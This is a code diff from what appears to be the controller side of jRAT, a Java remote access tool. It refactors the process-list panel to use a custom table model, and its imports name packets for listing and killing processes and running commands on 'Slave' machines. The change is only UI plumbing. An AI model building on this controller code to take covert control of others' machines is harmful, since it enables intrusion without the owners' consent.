@@ -10,12 +10,12 @@ import javax.swing.JButton;
 import javax.swing.JScrollPane;
 import javax.swing.JTable;
 import javax.swing.JToolBar;
-import javax.swing.table.DefaultTableModel;
 
 import se.jrat.controller.Slave;
 import se.jrat.controller.packets.outgoing.Packet19ListProcesses;
 import se.jrat.controller.packets.outgoing.Packet20KillProcess;
 import se.jrat.controller.packets.outgoing.Packet38RunCommand;
+import se.jrat.controller.ui.components.TableModel;
 import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.renderers.table.ProcessTableRenderer;
 import se.jrat.controller.utils.Utils;
@@ -26,10 +26,10 @@ import com.redpois0n.oslib.OperatingSystem;
 public class PanelControlRemoteProcess extends PanelControlParent {
 
 	private JTable table;
-	private DefaultTableModel model;
+	private TableModel model;
 	private JToolBar toolBar;
 
-	public DefaultTableModel getModel() {
+	public TableModel getModel() {
 		return model;
 	}
 
@@ -110,7 +110,7 @@ public class PanelControlRemoteProcess extends PanelControlParent {
 
 		table = new DefaultJTable();
 		table.setDefaultRenderer(Object.class, new ProcessTableRenderer());
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Name", "Process ID", "Type/User", "Memory usage" }));
+		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Name", "Process ID", "Type/User", "Memory usage" }));
 		table.getColumnModel().getColumn(0).setPreferredWidth(287);
 		table.getColumnModel().getColumn(2).setPreferredWidth(108);
 		table.getColumnModel().getColumn(3).setPreferredWidth(100);
